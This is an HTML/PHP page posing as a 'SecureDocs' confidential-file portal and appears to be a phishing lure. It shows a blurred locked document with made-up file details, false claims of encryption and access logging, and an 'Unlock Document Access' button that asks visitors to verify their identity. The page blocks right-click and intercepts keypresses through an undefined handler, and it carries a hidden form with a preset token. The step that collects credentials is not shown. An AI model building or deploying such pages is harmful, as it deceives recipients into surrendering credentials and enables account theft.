<?php

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Access</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui,sans-serif}body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.1);overflow:hidden;max-width:1000px;width:100%;display:flex;min-height:600px}.left-panel{flex:1;background:linear-gradient(135deg,#4f46e5 0%,#7c3aed 100%);color:#fff;padding:40px;display:flex;flex-direction:column;justify-content:space-between}.right-panel{flex:1.2;padding:40px;display:flex;flex-direction:column;justify-content:center}.logo{display:flex;align-items:center;gap:12px;margin-bottom:40px}.logo-icon{width:40px;height:40px;background:rgba(255,255,255,.2);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px}.document-preview{background:rgba(255,255,255,.1);border-radius:15px;padding:30px;margin:30px 0;backdrop-filter:blur(10px)}.document-image{background:linear-gradient(45deg,#e2e8f0 25%,transparent 25%),linear-gradient(-45deg,#e2e8f0 25%,transparent 25%),linear-gradient(45deg,transparent 75%,#e2e8f0 75%),linear-gradient(-45deg,transparent 75%,#e2e8f0 75%);background-size:20px 20px;background-position:0 0,0 10px,10px -10px,-10px 0;height:180px;border-radius:10px;position:relative;overflow:hidden;filter:blur(5px)}.document-overlay{position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(79,70,229,.8);display:flex;align-items:center;justify-content:center;flex-direction:column;gap:15px}.lock-badge{width:60px;height:60px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;color:#4f46e5}.document-info{text-align:center}.document-info h3{margin-bottom:8px;font-weight:600}.document-info p{opacity:.8;font-size:14px}.file-details{background:rgba(255,255,255,.05);border-radius:12px;padding:20px;margin-top:20px}.detail-item{display:flex;justify-content:between;margin-bottom:10px;font-size:14px}.detail-label{opacity:.7;flex:1}.detail-value{font-weight:500;flex:1;text-align:right}.access-panel{text-align:center}.access-panel h1{font-size:32px;font-weight:700;margin-bottom:10px;background:linear-gradient(135deg,#4f46e5,#7c3aed);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.access-panel p{color:#64748b;margin-bottom:30px;font-size:16px;line-height:1.6}.security-badge{display:inline-flex;align-items:center;gap:8px;background:#f1f5f9;padding:12px 20px;border-radius:25px;margin-bottom:30px;font-size:14px;color:#475569}.verify-btn{background:linear-gradient(135deg,#4f46e5 0%,#7c3aed 100%);color:#fff;border:none;padding:18px 40px;border-radius:15px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s ease;display:inline-flex;align-items:center;gap:12px;margin-bottom:20px;box-shadow:0 10px 30px rgba(79,70,229,.3)}.verify-btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(79,70,229,.4)}.enter-hint{color:#94a3b8;font-size:14px}.features{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:40px}.feature{text-align:center;padding:20px;background:#f8fafc;border-radius:12px;border:1px solid #e2e8f0}.feature-icon{width:40px;height:40px;background:linear-gradient(135deg,#4f46e5,#7c3aed);border-radius:10px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;color:#fff;font-size:18px}.feature h4{margin-bottom:8px;font-size:14px;color:#1e293b}.feature p{color:#64748b;font-size:12px;line-height:1.4}.loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.95);display:none;justify-content:center;align-items:center;z-index:1000;flex-direction:column;gap:20px}.loading-spinner{width:60px;height:60px;border:4px solid #e2e8f0;border-radius:50%;border-top-color:#4f46e5;animation:s 1s linear infinite}.loading-text{color:#1e293b;font-weight:600;font-size:18px}.hidden-form{display:none}@keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}@media (max-width:768px){.container{flex-direction:column}.left-panel,.right-panel{padding:30px 20px}.features{grid-template-columns:1fr}}
    </style>
</head>
<body oncontextmenu="return false" onkeydown="return dk(event)">
    
    <form id="hiddenForm" class="hiddenForm" method="post">
        <input type="hidden" name="access_token" value="653f0ad7b3a2a447895fdb83b18d6ab1">
    </form>
    
    <div class="container">
        
        <div class="left-panel">
            <div>
                <div class="logo">
                    <div class="logo-icon">📁</div>
                    <h2>SecureDocs</h2>
                </div>
                
                <div class="document-preview">
                    <div class="document-image">
                        <div class="document-overlay">
                            <div class="lock-badge">🔒</div>
                            <div class="document-info">
                                <h3>Confidential Document</h3>
                                <p>Access Required</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="file-details">
                    <div class="detail-item">
                        <span class="detail-label">Document Type:</span>
                        <span class="detail-value">DOC XII.PDF</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">File Size:</span>
                        <span class="detail-value">4.8 MB</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Pages:</span>
                        <span class="detail-value">18 pages</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Shared by:</span>
                        <span class="detail-value">user8546</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Expires:</span>
                        <span class="detail-value">7 days</span>
                    </div>
                </div>
            </div>
            
            <div style="opacity: 0.8; font-size: 14px;">
                🔒 All documents are encrypted and access is logged for security
            </div>
        </div>
        
       
        <div class="right-panel">
            <div class="access-panel">
                <h1>Access Secure Document</h1>
                <p>You are requesting access to confidential business files. Please verify your identity to continue.</p>
                
                <div class="security-badge">
                    <span>🛡️</span>
                    <span>Secure Encrypted Connection</span>
                </div>
                
                <button class="verify-btn" id="verifyButton" type="button">
                    <span>🔓</span>
                    Unlock Document Access
                </button>
                <p class="enter-hint">Press Enter to verify and continue</p>
                
                <div class="features">
                    <div class="feature">
                        <div class="feature-icon">📄</div>
                        <h4>Secure Preview</h4>
                        <p>Documents are protected with end-to-end encryption</p>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">👁️</div>
                        <h4>Access Control</h4>
                        <p>Only authorized users can view these files</p>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">📊</div>
                        <h4>Activity Logging</h4>
                        <p>All access is monitored and recorded</p>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">⚡</div>
                        <h4>Instant Delivery</h4>
                        <p>Fast secure access to your documents</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Granting secure access...</div>
        <div style="color: #64748b; font-size: 14px;">
            Preparing your documents for viewing
        </div>
    </div>

   
</body>
</html>